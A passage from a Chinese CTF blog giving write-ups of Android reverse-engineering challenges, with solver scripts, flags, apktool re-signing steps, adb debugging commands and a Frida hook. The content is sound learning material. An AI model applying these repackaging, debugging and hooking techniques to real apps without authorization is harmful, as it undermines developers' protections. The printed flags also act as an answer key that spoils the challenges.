class="string">'2'</span>, <span class="string">'P'</span>, <span class="string">'Q'</span>, <span class="string">'R'</span>, <span class="string">'S'</span>, <span class="string">'T'</span>, <span class="string">'K'</span>, <span class="string">'L'</span>, <span class="string">'M'</span>,</span><br><span class="line">        <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'Z'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'U'</span>, <span class="string">'V'</span>, <span class="string">'W'</span>, <span class="string">'X'</span>, <span class="string">'Y'</span>, <span class="string">'e'</span>,</span><br><span class="line">        <span class="string">'f'</span>, <span class="string">'g'</span>, <span class="string">'h'</span>, <span class="string">'i'</span>, <span class="string">'j'</span>, <span class="string">'k'</span>, <span class="string">'l'</span>, <span class="string">'m'</span>, <span class="string">'n'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">enc = <span class="string">'5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs='</span></span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">'='</span>:</span><br><span class="line">        ans += [base.index(i)]</span><br><span class="line">ans = <span class="string">''</span>.join([<span class="string">'&#123;:0&gt;6&#125;'</span>.format(bin(i)[<span class="number">2</span>:]) <span class="keyword">for</span> i <span class="keyword">in</span> ans])</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ans)//<span class="number">8</span>):</span><br><span class="line">    flag += chr(int(ans[<span class="number">8</span>*i:<span class="number">8</span>*(i+<span class="number">1</span>)], <span class="number">2</span>))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#05397c42f9b6da593a3644162d36eb01</span></span><br></pre></td></tr></table></figure><h3 id="easy-so"><a href="#easy-so" class="headerlink" title="easy-so"></a>easy-so</h3><p>简单考了java中对动态链接库的调用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s = list(<span class="string">'f72c5a36569418a20907b55be5bf95ad'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">    s[<span class="number">2</span>*i], s[<span class="number">2</span>*i+<span class="number">1</span>] = s[<span class="number">2</span>*i+<span class="number">1</span>], s[<span class="number">2</span>*i]</span><br><span class="line">flag = s[len(s)//<span class="number">2</span>:len(s)] + s[<span class="number">0</span>:len(s)//<span class="number">2</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#90705bb55efb59da7fc2a5636549812a</span></span><br></pre></td></tr></table></figure><h3 id="easyjava"><a href="#easyjava" class="headerlink" title="easyjava"></a>easyjava</h3><p>就是读繁琐的java代码，理解程序加密流程。</p><p>考点：java代码的阅读能力；简单的置换加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'wigwrkaugala'</span></span><br><span class="line">base = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">a = [<span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>,</span><br><span class="line">     <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>]</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    ans += [a[base.index(i)]]</span><br><span class="line">print(ans)</span><br><span class="line">b = [<span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>,</span><br><span class="line">         <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">25</span>]</span><br><span class="line">base = list(base)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">    flag += base[b[i]]</span><br><span class="line">    b = b[<span class="number">1</span>:len(b)] + [b[<span class="number">0</span>]]</span><br><span class="line">    base = base[<span class="number">1</span>:len(base)] + [base[<span class="number">0</span>]]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br><span class="line"><span class="comment">#venividivkcr</span></span><br></pre></td></tr></table></figure><h3 id="Ph0en1x-100"><a href="#Ph0en1x-100" class="headerlink" title="Ph0en1x-100"></a>Ph0en1x-100</h3><p>输入字符和和so层函数获得的字符串经过md5加密后进行比较。</p><p>从这个题练习了下调试so。注意：安卓模拟器不能调试arm架构的so文件，还是最好用真机来调试native层。</p><p>首先是直接模拟程序跑flag：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">46</span>,  <span class="number">54</span>,  <span class="number">66</span>,  <span class="number">76</span>,  <span class="number">95</span>, <span class="number">191</span>, <span class="number">224</span>,  <span class="number">58</span>, <span class="number">168</span>, <span class="number">195</span>, </span><br><span class="line">   <span class="number">32</span>,  <span class="number">99</span>, <span class="number">137</span>, <span class="number">183</span>, <span class="number">192</span>,  <span class="number">28</span>,  <span class="number">29</span>,  <span class="number">68</span>, <span class="number">194</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">127</span>, <span class="number">237</span>,   <span class="number">2</span>,  <span class="number">14</span>,  <span class="number">93</span>, <span class="number">102</span>, <span class="number">143</span>, <span class="number">152</span>, <span class="number">181</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">208</span>,  <span class="number">22</span>,  <span class="number">77</span>, <span class="number">131</span>, <span class="number">248</span>, <span class="number">251</span>,   <span class="number">1</span>,  <span class="number">67</span>,  <span class="number">71</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> b[] = <span class="string">"Hello Ph0en1x"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, v6 = <span class="built_in">strlen</span>(b);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> ( i = <span class="keyword">sizeof</span>(a) - <span class="number">2</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> v3 = a[i] + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *v7 = &amp;a[i - <span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> v4 = i % v6;</span><br><span class="line">a[i] = (b[v4] ^ (v3 - *v7)) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">0</span>] = (a[<span class="number">0</span>] ^ <span class="number">0x48</span>) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(a)<span class="number">-1</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(a[i]+<span class="number">1</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125;</span></span><br></pre></td></tr></table></figure><p>然后就是调试了。简单记一下流程：</p><p>准备工作：</p><p>1.解包程序，<strong>apktool.bat d a.apk</strong>。在AndroidManifest.xml中的<strong>application</strong>后面加上android:debuggable=”true”。</p><p>2.重新打包程序，<strong>apktool.bat b a</strong>，这时候在a文件夹中的dist下的就是目标重新打包后的程序。</p><p>3.对重打包后的apk进行签名。</p><ul><li>生成签名文件：keytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</li><li>进行签名：jarsigner -verbose -keystore abc.keystore -signedjar b.apk a.apk abc.keystore</li></ul><p>接下来把程序装入模拟器，运行，进行调试，操作和常规的调试elf文件差不多了。</p><p>以调试模式启动程序：<strong>adb shell am start -D -n 包名/.活动名</strong></p><p>端口转发：<strong>adb forward tcp:23946 tcp:23946</strong></p><p>因为我用的模拟器，这里用了x86架构的so文件才调试上，虽然有点不能理解，为什么模拟器里程序都能运行，说明对so文件是运行了的啊，那调试怎么就不行呢（<strong>在之后突然想到的想法补充：可能是题目有对应结构的so文件，只是没提供给我们</strong>），且android_server在模拟器里也可以运行的。。其实这里的提示可以看见它调用的是<strong>1/lib/x86/下的so</strong>。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206212259169.png" alt="image-20210206212259169"></p><p>嗯，，初学一个东西开始总是有很多疑惑的，等接触多了来慢慢理解。</p><p>ida中成功附加上程序后，在Modules模块找到我们要调试的so文件，再继续找到我们要调试的函数。</p><p>得到结果：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210206210632330.png" alt="image-20210206210632330"></p><h3 id="黑客精神"><a href="#黑客精神" class="headerlink" title="黑客精神"></a>黑客精神</h3><p>出现新知识点：so文件中的函数为动态注册。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182454660.png" alt="image-20210207182454660"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207182859376.png" alt="image-20210207182859376"></p><p>然后就是一个加上文件读写操作的异或加密。</p><p>2个涉及的函数功能：通常连用来计算出一个文件中数据的字节数。</p><ul><li>C 库函数 <strong>int fseek(FILE *stream, long int offset, int whence)</strong> 设置流 <strong>stream</strong> 的文件位置为给定的偏移 <strong>offset</strong>，参数 offset 意味着从给定的 <strong>whence</strong> 位置查找的字节数。</li><li>C 库函数 <strong>long int ftell(FILE *stream)</strong> 返回给定流 stream 的当前文件位置。</li></ul><p>接下来解题部分：直接输入密文值，在文件中找到异或后的值即是flag。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210207184727271.png" alt="image-20210207184727271"></p><h3 id="easy-dex"><a href="#easy-dex" class="headerlink" title="easy-dex"></a>easy-dex</h3><p>题目得到flag的难度不大，但涉及的知识还需要多学习。</p><p>jadx中发现没有dex文件，从AndroidMainfest.xml看到：NativeActivity，安卓进行ndk开发使用的，所以应该是转战so文件中了。<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/ncjKwbuX1qBF6ke.png" alt="image-20210208171101099"></p><p>找到android_main函数，首先是进行解密了2个字符串，打印出来就是app包路径相关的。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208171841729.png" alt="image-20210208171841729"></p><p>然后从打印的log，可以帮助识别程序的功能和流程。就是在10s内摇动手机100次，然后会使用这之间的表示次数的数据来解密一些数据代码：就是把enc分为10组，然后前8组分别和9, 19, 29…异或解密，后2组和89异或解密。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172040397.png" alt="image-20210208172040397"></p><p>然后解压缩数据，写入文件。从上面打印出的路径信息，可以猜测这个就是生成一个dex文件。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172227628.png" alt="image-20210208172227628"></p><p>仿照程序逻辑使用idapython解密数据后写入文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line">addr = <span class="number">0x07004</span></span><br><span class="line">length = <span class="number">0x3CA10</span></span><br><span class="line">n = length//<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">    a = get_byte(addr+i)</span><br><span class="line">    b = i//n</span><br><span class="line">    b = <span class="number">8</span> <span class="keyword">if</span> b &gt; <span class="number">8</span> <span class="keyword">else</span> b </span><br><span class="line">    c = b*<span class="number">10</span>+<span class="number">9</span></span><br><span class="line">    data += [a^c]</span><br><span class="line">data = bytes(data)</span><br><span class="line">f = open(<span class="string">'ans.Z'</span>, <span class="string">'wb'</span>)</span><br><span class="line">f.write(data)</span><br><span class="line">f.close()</span><br><span class="line">print(<span class="string">"-------success-----------"</span>)</span><br></pre></td></tr></table></figure><p>然后就是花了点时间的的uncompress操作，试了试linux下的发现不行。然后搜索文件头：<strong>78 9c</strong>，发现可以使用<a href="http://aluigi.org/mytoolz/offzip.zip" target="_blank" rel="noopener">Aluigi’s offzip</a> ：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172543745.png" alt="image-20210208172543745"></p><p>提取出文件其中的数据，得到一个dex文件：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175926442.png" alt="image-20210208175926442"></p><p>分析dex文件。发现有很多id，在res\values\public.xml中找到对应id的name，然后再到strings中找到对应name的字符串。对其注释了一下：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208172846985.png" alt="image-20210208172846985"></p><p>看了一圈后，可以知道我们输入的经过一种加密算法后与密文比较，而<strong>I have a male fish and a female fish.</strong>是key，看到只是取了它的32位，然后是key判断。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173320567.png" alt="image-20210208173320567"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208173332255.png" alt="image-20210208173332255"></p><p>开始从字符串fish以为是blowfish加密，但简单看了下流程，完全对不上。</p><blockquote><p><strong>blowfish是加密64bit为数据，密钥也是64bit位。把密文分为每8个字节一组，然后一组分成2个部分，进行轮函数加密。</strong></p></blockquote><p>但这里是每16个字节一组，且加密流程也不一样：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175231246.png" alt="image-20210208175231246"></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175306552.png" alt="image-20210208175306552"></p><p>最后，翻了一下这个加密中的数据用来搜索下找找相关的加密算法。</p><p>从最顶部的数据，google结果：<a href="https://xz.aliyun.com/t/5807" target="_blank" rel="noopener">TwoFish</a></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208175435115.png" alt="image-20210208175435115"></p><p>然后使用python解密一下：因为33位，不是16的倍数，用0补齐成了48位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twofish <span class="keyword">import</span> Twofish</span><br><span class="line"></span><br><span class="line">enc = [<span class="number">-120</span>, <span class="number">77</span>, <span class="number">-14</span>, <span class="number">-38</span>, <span class="number">17</span>, <span class="number">5</span>, <span class="number">-42</span>, <span class="number">44</span>, <span class="number">0xE0</span>, <span class="number">109</span>, <span class="number">85</span>, <span class="number">0x1F</span>, <span class="number">24</span>, <span class="number">-91</span>, <span class="number">0x90</span>, <span class="number">-83</span>, <span class="number">0x40</span>, <span class="number">-83</span>, <span class="number">0x80</span>, <span class="number">84</span>, <span class="number">5</span>, <span class="number">-94</span>, <span class="number">-98</span>, <span class="number">-30</span>, <span class="number">18</span>, <span class="number">70</span>, <span class="number">-26</span>, <span class="number">71</span>, <span class="number">5</span>, <span class="number">-99</span>, <span class="number">-62</span>, <span class="number">-58</span>, <span class="number">0x75</span>, <span class="number">29</span>, <span class="number">-44</span>, <span class="number">6</span>, <span class="number">0x70</span>, <span class="number">-4</span>, <span class="number">81</span>, <span class="number">84</span>, <span class="number">9</span>, <span class="number">22</span>, <span class="number">-51</span>, <span class="number">0x5F</span>, <span class="number">-34</span>, <span class="number">12</span>, <span class="number">0x2F</span>, <span class="number">77</span>]</span><br><span class="line">enc = [i&amp;<span class="number">0xff</span> <span class="keyword">for</span> i <span class="keyword">in</span> enc]</span><br><span class="line">enc = bytes(enc)</span><br><span class="line"></span><br><span class="line">key = <span class="string">'I have a male fish and a female '</span>.encode() <span class="comment">#bytes类型</span></span><br><span class="line"></span><br><span class="line">T = Twofish(key)</span><br><span class="line">flag = <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)//<span class="number">16</span>):</span><br><span class="line">    flag += T.decrypt(enc[<span class="number">16</span>*i:<span class="number">16</span>*(i+<span class="number">1</span>)])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#qwb&#123;TH3y_Io&lt;e_EACh_OTh3r_FOrEUER&#125;</span></span><br></pre></td></tr></table></figure><p>最后是做完题看了别人wp学习，发现：</p><ul><li>那个uncompress操作其实可以直接使用python的zlib模块，<strong>zlib.decompress(data)</strong> 就可以了。</li><li>可以把dex合成新的apk文件运行，接下来操作一下。</li></ul><p>dex合成新的apk文件：</p><p>1.把之前的app解包。</p><p>2.把<strong>AndroidManifest.xml</strong>中的android:hasCode=”false”属性去掉，默认为True。原因：之前的app是用c++开发的，app中并不包含java代码，所以把这个属性设置为False。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208185306706.png" alt="image-20210208185306706"></p><p>3.把<strong>AndroidManifest.xml</strong>中activity的android:name改为当前包和MainActivity。</p><p>4.把之前得到的dex文件改名为classes.dex放到解包目录下。</p><p>5.重新打包，并签名。</p><p>成功：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210208190250967.png" alt="image-20210208190250967"></p><h3 id="你是谁"><a href="#你是谁" class="headerlink" title="你是谁"></a>你是谁</h3><p>找到触摸响应的地方，可以看到<strong>sorted flag</strong>相关字符串，然后上面的getsna方法是得到汉字字符的unicode编码进行一个从小到大的选择排序，最后比较。</p><p>这里从排序结果后的汉字编码结果可以推出未经过排序后的值。</p><p>最后按照从字符串的提示，把汉字结果再转回unicode编码再套上flag{}即是。</p><h3 id="基础android"><a href="#基础android" class="headerlink" title="基础android"></a>基础android</h3><p>看了下程序逻辑，解出第一个密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">107</span>-i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">12</span>)]</span><br></pre></td></tr></table></figure><p>然后进入MainActivity2把第二次的输入作为参数发送了一个广播：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151141668.png" alt="image-20210220151141668"></p><p>继续跟到接受广播的地方，看到又开始了一个新的活动。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151639862.png" alt="image-20210220151639862"></p><p>但看了后面的NextContent也没有验证图片显示码的地方，但是读了下代码，功能就是取出app中的资源文件中的timg_2.zip作为图片替换原来的图片。直接在jeb的Assets找到该文件，打开即是。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220151914447.png" alt="image-20210220151914447"></p><p>其实，既然是NextContent活动直接更新了有flag的图片，直接adb启动指定的活动，也可以得到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -n com.example.test.ctf02/.NextContent</span><br></pre></td></tr></table></figure><p>最后学习知道了<strong>那个图片显示码其实触发广播需要的密码</strong>，在清单文件有。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210220152303564.png" alt="image-20210220152303564"></p><p>且<strong>android:exported=”true”</strong>属性代表可以进行外部调用，那我们还可以用adb构造一个广播来达到目的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.is.very.fun</span><br></pre></td></tr></table></figure><h3 id="APK逆向"><a href="#APK逆向" class="headerlink" title="APK逆向"></a>APK逆向</h3><p>把Tenshine进行md5().hexdigest()加密后取出偶数位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = md5(<span class="string">b'Tenshine'</span>).hexdigest()</span><br><span class="line">flag = [s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)) <span class="keyword">if</span> i%<span class="number">2</span> == <span class="number">0</span>]</span><br><span class="line">print(<span class="string">''</span>.join(flag))</span><br></pre></td></tr></table></figure><p>题目很简单，但是从搭环境开始通过这个题学了一下frida hook java层。</p><p>简单记录一下流程：</p><blockquote><ol><li>安卓端执行下载好的对应frida服务。</li><li>进行2次端口转发：<strong><code>adb forward tcp:27043 tcp:27043</code>和<code>adb forward tcp:27042 tcp:27042</code></strong></li><li>安卓端运行app</li><li>执行写好的hook脚本。</li></ol></blockquote><p>贴下hook代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">jscode = <span class="string">'''</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var MainActivity = Java.use('com.example.crackme.MainActivity');</span></span><br><span class="line"><span class="string">        MainActivity.toHexString.implementation = function(a, b)&#123;</span></span><br><span class="line"><span class="string">            var ans = this.toHexString(a, b);</span></span><br><span class="line"><span class="string">            send(ans);</span></span><br><span class="line"><span class="string">            return ans;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">   </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">'type'</span>] == <span class="string">'send'</span>:</span><br><span class="line">        print(message[<span class="string">'payload'</span>][::<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">'com.example.crackme'</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">'message'</span>, on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h3 id="人民的名义-抓捕赵德汉1-200"><a href="#人民的名义-抓捕赵德汉1-200" class="headerlink" title="人民的名义-抓捕赵德汉1-200"></a>人民的名义-抓捕赵德汉1-200</h3><p>一个jar包，用jd-gui看一下java代码。一个md5加密，在线解一下即可。</p><p>这里了解一下什么时候jar包：<strong>jar包是eclipse下的压缩包，由多个class文件压缩而成的。</strong></p><h3 id="boomshakalaka-3"><a href="#boomshakalaka-3" class="headerlink" title="boomshakalaka-3"></a>boomshakalaka-3</h3><p>飞机大战游戏。</p><p>jeb反编译后找到入口类：多次调用了a类中的d方法。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224192959108.png" alt="image-20210224192959108"></p><p>看看a类d方法功能：其中getSharedPreferences()是关键，返回一个SharedPreference对象，它会在/data/data/com.example.plane/下生成一个xml文件，以键值对的形式存储向其中输入的数据。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224193105424.png" alt="image-20210224193105424"></p><p>adb看一下：</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195210759.png" alt="image-20210224195210759"></p><p>但程序提示的打到最高分，java层没有任何与分数相关的地方，进入so中找到分数的地方：分析下且从DATA可以知道，这里就是根据我们打的分数不断向xml文件中添加写入不同的字符串。<img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224195529004.png" alt="image-20210224195529004"></p><p>而要写入字符串字符串的开始和结尾是确定了的，只是中间的字符串会因为分数不同而不通过，这个自己打游戏然后查看数据或者直接ida中分析都可以知道。</p><p>注意的地方：要指定的分数才会写入指定字符串，所以如果打游戏测试的话要算着打😂。</p><p>测试一波后，写入顺序就是给出的，把开始结尾确定好后向中间填充好base64解码得到flag。</p><p><strong>MGN0ZntDMGNvUzJkX0FuRHJvMWRfRzBtRV9Zb1VfS24wdz99</strong></p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210224202624546.png" alt="image-20210224202624546"></p><h3 id="android1"><a href="#android1" class="headerlink" title="android1"></a>android1</h3><p>app进行了梆梆加固，开始准备环境安装dump dex，准备完开始安装app发现报错。</p><p><img src="/2021/02/05/Andriod%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/image-20210225225117463.png" alt="image-20210225225117463"></p><p>后面才发现了是因为app没有签名，签上名后还要注意：</p><p>安装时带上-t选项。原因：</p><p>Android Studio 3.0会在debug apk的<code>manifest</code>文件<code>application</code>标签里自动添加 <code>android:testOnly=&quot;true&quot;</code>属性。</p><p>成功安装程序，打开提示资源文件，进而从values的string.xml中找到flag。</p><p><strong>flag{1FF9B2CCB90A2D943DBAA072DF0A279C}</strong></p><h3 id="Android2-0"><a href="#Android2-0" class="headerlink" title="Android2.0"></a>Android2.0</h3><p>简单考了一下so层。</p><p><strong>flag{sosorryla}</strong></p><h3 id="Illusion"><a href="#Illusion" class="headerlink" 